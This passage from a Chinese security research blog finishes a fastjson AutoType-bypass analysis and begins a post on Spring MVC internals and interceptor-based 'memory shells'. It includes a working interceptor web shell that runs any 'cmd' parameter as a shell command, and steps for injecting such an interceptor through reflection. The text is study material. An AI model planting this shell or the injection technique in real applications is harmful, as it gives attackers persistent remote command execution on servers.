所以能够通过checkAutoType的检查,<br>json解析器通过<code>java.lang.AutoCloseable</code>获取对应的反序列化器为一个<code>JavaBeanDeserializer</code>(<code>config.getDeserializer</code>的逻辑是经过一系列判断后还未找到与其对应的反序列化器时, 就构造一个JavaBeanDeserializer, 即使这个类并不是一个JavaBean), <code>JavaBeanDeserializer</code>解析到后面的<code>@type</code>, 拿到对应的类名<code>EvilClass.VulAutoCloseable</code> , 又会尝试去获取<code>EvilClass.VulAutoCloseable</code>的反序列化器, 在此之前会对此类名进行<code>checkAutoType</code>检查, 此时会将<code>java.lang.AutoCloseable</code>作为期望类传入, 但这个版本AutoType会校验<code>EvilClass.VulAutoCloseable</code>和期望类, 具体如下:</p><p>期望类不能是下面几种:<br>(可以看见这里是没有禁用<code>java.lang.AutoCloseable</code>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Serializable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Cloneable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Closeable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">EventListener</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Iterable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Collection</span>.class </span><br></pre></td></tr></table></figure><p><code>EvilClass.VulAutoCloseable</code>不能实现以下接口(或类继承)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassLoader.class <span class="comment">// classloader is danger  </span></span><br><span class="line">javax.sql.DataSource.class <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">javax.sql.RowSet.class</span><br></pre></td></tr></table></figure><p>由于很多jndi的利用类都是实现了<code>javax.sql.DataSource.class</code>和<code>javax.sql.RowSet.class</code>, 这里的限制就导致了很难再进行jndi注入了</p><p>我们还是跟踪代码过一遍调试<br>前面的不必多说, 从<code>DefaultJSONParser</code>解析出<code>java.lang.AutoCloseable</code>开始<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603100421.png" alt="image.png"><br>对<code>java.lang.AutoCloseable</code>进行checkAutoType检查, 跟进<br>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>是存在于默认的mappings中的&#x3D;&#x3D;(也就是我们再之前利用缓存绕过的那个mappings)</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101026.png" alt="image.png"></p><p>从mappings中拿到class, 在1374行返回<br>回到<code>DefaultJSONParser</code>, 往下走, 拿到其反序列化器, 是一个<code>JavaBeanDeserializer</code>, 跟进反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101420.png" alt="image.png"></p><p>再跟进, 后面json字符串扫描过程和之前一样的, 依旧是扫描到<code>@type</code>的值后再checkAutoType, 再尝试获取反序列化器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102044.png" alt="image.png"><br>注意此时对<code>EvilClass.VulAutoCloseable</code>进行checkAutoType时传入了期望类<code>AutoCloseable</code> 跟进<br>这里有期望类的黑名单<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102437.png" alt="image.png"></p><p>在这里, 我们的自定义的类被加载<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102755.png" alt="image.png"></p><p>再往下, 对被check的类做了一些检查, 不能继承黑名单中的接口或类, 且需要继承期望类<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102604.png" alt="image.png"><br>通过检查后, 返回到json解析器, 之后就是拿到反序列化器进行反序列化的过程了, 最终就是和之前一样, 调用构造器实例化这个类, 然后调用它的getter和setter为其添加属性</p><p>此利用方式在1.2.69被修复, 修复方式就是黑名单, 并且这次对期望类的黑名单也改为了哈希<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603140542.png" alt="image.png"></p><h2 id="fastjson-1-2-80-期望类利用-异常类Throwable"><a href="#fastjson-1-2-80-期望类利用-异常类Throwable" class="headerlink" title="fastjson 1.2.80 期望类利用(异常类Throwable)"></a>fastjson 1.2.80 期望类利用(异常类Throwable)</h2><p>1.2.68的修复方式简单粗暴，将<code>java.lang.Runnable</code>、<code>java.lang.Readable</code>和<code>java.lang.AutoCloseable</code>加入了黑名单，那么1.2.80用的就是另一个期望类：异常类Throwable。</p><p>触发过程和之前的一样AutoCloseable一样, 困难点就是在于寻找对应的gadget了</p><h2 id="fastjson-1-2-80-期望类利用-Exception"><a href="#fastjson-1-2-80-期望类利用-Exception" class="headerlink" title="fastjson 1.2.80 期望类利用(Exception)"></a>fastjson 1.2.80 期望类利用(Exception)</h2><p>依旧困难点是在于寻找对应的gadget了, 最近的京麒2025在最新版本1.2.83也是利用的这个期望类</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/posts/fastjson-1.2.80/">y4er.com# fastjson 1.2.80 漏洞分析</a><br><a href="https://b1ue.cn/archives/382.html">b1ue.cn# fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a><br><a href="https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w">https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring架构原理 &amp; Spring内存马</title>
      <link href="/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring架构原理-Spring内存马"><a href="#Spring架构原理-Spring内存马" class="headerlink" title="Spring架构原理 &amp; Spring内存马"></a>Spring架构原理 &amp; Spring内存马</h1><h3 id="spring-mvc流程"><a href="#spring-mvc流程" class="headerlink" title="spring mvc流程"></a>spring mvc流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805192207.png" alt="image.png"></p><h4 id="1-Spring-MVC的核心组件和大致处理流程"><a href="#1-Spring-MVC的核心组件和大致处理流程" class="headerlink" title="1.Spring MVC的核心组件和大致处理流程"></a>1.Spring MVC的核心组件和大致处理流程</h4><ol><li><p>DispatcherServlet是前端控制器，它负责接收Request并将Request转发给对应的处理组件；</p></li><li><p>HandlerMapping负责完成url到Controller映射，可以通过它来找到对应的处理Request的Controller；</p></li><li><p>Controller处理Request，并返回ModelAndVIew对象，ModelAndView是封装结果视图的组件；④~⑦表示视图解析器解析ModelAndView对象并返回对应的视图给客户端。</p></li></ol><h4 id="2-IOC容器"><a href="#2-IOC容器" class="headerlink" title="2.IOC容器"></a>2.IOC容器</h4><p>IOC（控制反转）容器是Spring框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。IOC容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。Spring框架提供了多种实现IOC容器的方式，下面讲两种常见的：</p><p>BeanFactory：Spring的最基本的IOC容器，提供了基本的IOC功能，只有在第一次请求时才创建对象。ApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能。ApplicationContext在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。</p><h4 id="3-Spring-MVC-九大组件"><a href="#3-Spring-MVC-九大组件" class="headerlink" title="3.Spring MVC 九大组件"></a>3.Spring MVC 九大组件</h4><p>这九大组件需要有个印象：</p><p>&#x3D;&#x3D;DispatcherServlet（派发Servlet)&#x3D;&#x3D;：负责将请求分发给其他组件，是整个Spring MVC流程的核心；<br>&#x3D;&#x3D;HandlerMapping（处理器映射)&#x3D;&#x3D;：用于确定请求的处理器（Controller）；<br>&#x3D;&#x3D;HandlerAdapter（处理器适配器)&#x3D;&#x3D;：将请求映射到合适的处理器方法，负责执行处理器方法；<br>&#x3D;&#x3D;HandlerInterceptor（处理器拦截器）&#x3D;&#x3D;：允许对处理器的执行过程进行拦截和干预；<br>&#x3D;&#x3D;Controller（控制器）&#x3D;&#x3D;：处理用户请求并返回适当的模型和视图；<br>&#x3D;&#x3D;ModelAndView（模型和视图）&#x3D;&#x3D;：封装了处理器方法的执行结果，包括模型数据和视图信息；<br>&#x3D;&#x3D;ViewResolver（视图解析器）&#x3D;&#x3D;：用于将逻辑视图名称解析为具体的视图对象；<br>&#x3D;&#x3D;LocaleResolver（区域解析器）&#x3D;&#x3D;：处理区域信息，用于国际化；<br>&#x3D;&#x3D;ThemeResolver（主题解析器）&#x3D;&#x3D;：用于解析Web应用的主题，实现界面主题的切换。</p><h4 id="九大组件初始化"><a href="#九大组件初始化" class="headerlink" title="九大组件初始化"></a>九大组件初始化</h4><p>首先是 位于 <code>org.springframework:spring-webmvc</code>的:<br><code>org.springframework.web.servlet.DispatcherServlet</code>, 查看其类结构, 没有一个总体的init方法, 其父类<code>FrameworkServlet</code>也一样, 但在其父类的父类<code>HttpServletBean</code>存在init方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805193420.png" alt="image.png"></p><p>其中的逻辑暂且不论, 关键在最后的<code>initServletBean();</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805193832.png" alt="image.png"></p><p>这个方法接口是留给子类实现的</p><p>FrameworkServlet对这个方法进行了实现<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194018.png" alt="image.png"><br>其中调用了<code>initWebApplicationContext</code>方法来初始化IOC容器<br>其中会调用到onRefresh<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194445.png" alt="image.png"></p><p>这个方法也是留给子类实现的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194539.png" alt="image.png"><br>看注释就知道这是在context刷新hou被调用用来执行一些特定于 Servlet的功能<br>DispatcherServlet对其进行了实现,  可以砍价其中的逻辑就是对九大组件的初始化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194828.png" alt="image.png"></p><h3 id="SpringMVC-框架Interceptor组件"><a href="#SpringMVC-框架Interceptor组件" class="headerlink" title="SpringMVC 框架Interceptor组件"></a>SpringMVC 框架Interceptor组件</h3><p>TestInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                java.io.<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">                ProcessBuilder processBuilder;  </span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;  </span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);  </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd);  </span><br><span class="line">                &#125;  </span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">inputScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);  </span><br><span class="line">                output = inputScanner.hasNext() ? inputScanner.next(): output;  </span><br><span class="line">                inputScanner.close();  </span><br><span class="line">                writer.write(output);  </span><br><span class="line">                writer.flush();  </span><br><span class="line">                writer.close();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored)&#123;&#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要将TestInterceptor注册进去<br>WebConfig.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Configuration</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;  </span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>()).addPathPatterns(<span class="string">&quot;/**&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805195642.png" alt="image.png"></p><h4 id="Spring-Interceptor引入与执行流程分析"><a href="#Spring-Interceptor引入与执行流程分析" class="headerlink" title="Spring Interceptor引入与执行流程分析"></a>Spring Interceptor引入与执行流程分析</h4><p>&#x3D;&#x3D;Spring Interceptor&#x3D;&#x3D;和&#x3D;&#x3D;Filter&#x3D;&#x3D;的区别</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>主要区别</strong></td><td><strong>拦截器</strong></td><td><strong>过滤器</strong></td></tr><tr><td>机制</td><td>Java反射机制</td><td>函数回调</td></tr><tr><td>是否依赖Servlet容器</td><td>不依赖</td><td>依赖</td></tr><tr><td>作用范围</td><td>对action请求起作用</td><td>对几乎所有请求起作用</td></tr><tr><td>是否可以访问上下文和值栈</td><td>可以访问</td><td>不能访问</td></tr><tr><td>调用次数</td><td>可以多次被调用</td><td>在容器初始化时只被调用一次</td></tr><tr><td>IOC容器中的访问</td><td>可以获取IOC容器中的各个bean（基于FactoryBean接口）</td><td>不能在IOC容器中获取bean</td></tr></tbody></table><p>Servlet只在第一次访问时才会被加载<br>断点打在HttpServletBean的init方法, 来看看请求是如何被处理的<br>看这个调用栈非常熟悉, 还是tomcat那一套<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805201205.png" alt="image.png"><br>之后就是上面的流程</p><p>加载完后 在<code>DispatcherServlet#doDispatch</code>方法也打上断点, 来看看<code>Dispatcher</code>是如何处理请求的</p><p>调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:<span class="number">1047</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">964</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">670</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">779</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">541</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">360</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">399</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">893</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1789</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>从这里可以看出来Dispatcher就是一个之前tomcat中的Servlet</p><p>往下走调用了getHandler这个函数<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805204345.png" alt="image.png"><br>跟进去, 看注释知道他会返回一个与此次request对应的<code>HandlerExecutionChain</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805204459.png" alt="image.png"><br>其中的逻辑是通过<code> mapping.getHandler(request);</code>来尝试获取handler, 只要获取到就返回<br>跟进去看看这个方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805223552.png" alt="image.png"></p><ol><li>先是通过getHandlerInternal来获取，如果获取不到，那就调用getDefaultHandler来获取默认的，如果还是获取不到，就直接返回null；</li><li>然后检查handler是不是一个字符串，如果是，说明可能是一个Bean的名字，这样的话就通过ApplicationContext来获取对应名字的Bean对象，这样就确保 handler 最终会是一个合法的处理器对象；</li><li>接着检查是否已经有缓存的请求路径，如果没有缓存就调用 <code>initLookupPath(request)</code> 方法来初始化请求路径的查找；</li><li>最后通过 <code>getHandlerExecutionChain</code> 方法创建一个处理器执行链。</li></ol><p>跟进到<code>getHandlerExecutionChain</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805223944.png" alt="image.png"></p><ol><li>如果 handler 已是 HandlerExecutionChain 类型，则直接使用；</li><li>否则新建一个包装该处理器的执行链，遍历所有adaptedInterceptors拦截器，若拦截器是 MappedInterceptor 类型且匹配当前请求，则将其加入执行链。</li><li>返回最终的执行链对象。<br>这样就得到了<code>executionChain</code></li></ol><p>回到getHandler方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224234.png" alt="image.png"><br>后面是对于需要跨域的请求的处理</p><p>之后回到doDispatch 到applyPreHandle就是遍历执行各个interceptor<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224649.png" alt="image.png"><br>可以看见执行到了preHandle方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224748.png" alt="image.png"></p><h4 id="interceptor型内存马"><a href="#interceptor型内存马" class="headerlink" title="interceptor型内存马"></a>interceptor型内存马</h4><p>思路<br>Spring Interceptor型内存马的编写思路：</p><ol><li>获取ApplicationContext</li><li>通过AbstractHandlerMapping反射来获取adaptedInterceptors</li><li>将要注入的恶意拦截器放入到adaptedInterceptors中</li></ol><p>简单思路：</p><ol><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ol><p>★当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层：<br>    &#x3D;&#x3D;<code>HttpRequest</code>&#x3D;&#x3D;–&gt; &#x3D;&#x3D;Filter&#x3D;&#x3D; –&gt; &#x3D;&#x3D;<code>DispactherServlet</code>&#x3D;&#x3D; –&gt; &#x3D;&#x3D;<code>Interceptor</code>&#x3D;&#x3D; –&gt; &#x3D;&#x3D;Controller&#x3D;&#x3D;<br>下面的问题就是如何动态地注册一个恶意的Interceptor了。</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806163941.png" alt="image.png"></p><p>可以看见只要反射修改<code>AbstractHandlerMapping</code>即可</p><p>我们当前类是<code>RequestMappingHandlerMapping</code>显然是继承了<code>AbstractHandlerMapping</code><br>调用栈往回调, 就能看见这个类的来历, 他是<code>DispatcherServlet</code>的<code>this.handlerMappings</code>中其中一个mapping, 听名字就知道是作用于一个request的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806164409.png" alt="image.png"></p><p>按照之前tomcat的思路, 也就是说获取到<code>DispatcherServlet</code>就能获取到它</p><p>看了别的文章, 发现使用的是<code>WebApplicationContext</code>来获取<code>abstractHandlerMapping</code><br>为什么这样? </p><h5 id="WebApplicationContext从何而来-有什么作用"><a href="#WebApplicationContext从何而来-有什么作用" class="headerlink" title="WebApplicationContext从何而来? 有什么作用?"></a><code>WebApplicationContext</code>从何而来? 有什么作用?</h5><p>这里所说的<code>WebApplicationContext</code>是一个接口, 在springboot启动时便有了一个context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806222257.png" alt="image.png"><br>也就是<code>AnnotationConfigServletWebServerApplicationContext</code> 这个类是实现了<code>WebApplicationContext</code>接口的<br><code>WebApplicationContext</code>中存放了各种bean, 其中就包括了我们要获取的AbstractHandlerMapping<br>context创建bean的细节见[[Spring Web MVC 框架#bean创建流程]]</p><p>而<code>DispatcherServlet</code>也持有了这个<code>WebApplicationContext</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807164313.png" alt="image.png"></p><blockquote><p>在 Spring Boot 之前，<code>DispatcherServlet</code> 自身需要创建一个<strong>子上下文</strong>来管理 Web 层 Bean。但在 Spring Boot 的世界里，这个职责被简化了。</p></blockquote><blockquote><p>现在，<code>DispatcherServlet</code> 的主要任务就是<strong>作为一个请求处理器</strong>。它不再需要自己去创建和管理 Bean，而是<strong>直接使用</strong>那个已经创建好的、包含了所有 Bean 的 <code>AnnotationConfigServletWebServerApplicationContext</code>。</p></blockquote><h5 id="如何获取WebApplicationContext"><a href="#如何获取WebApplicationContext" class="headerlink" title="如何获取WebApplicationContext"></a>如何获取WebApplicationContext</h5><p>按照文章中的说法, 有四种方法：</p><p><strong>1.getCurrentWebApplicationContext</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。</p><p><strong>2.WebApplicationContextUtils</strong></p><p>_通过这种方法获得的也是一个Root WebApplicationContext。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure><p><strong>3.RequestContextUtils</strong></p><p>通过<code>ServletRequest</code>类的实例来获得<code>Child WebApplicationContext</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4.getAttribute</strong></p><p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 <code>Child WebApplicationContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> 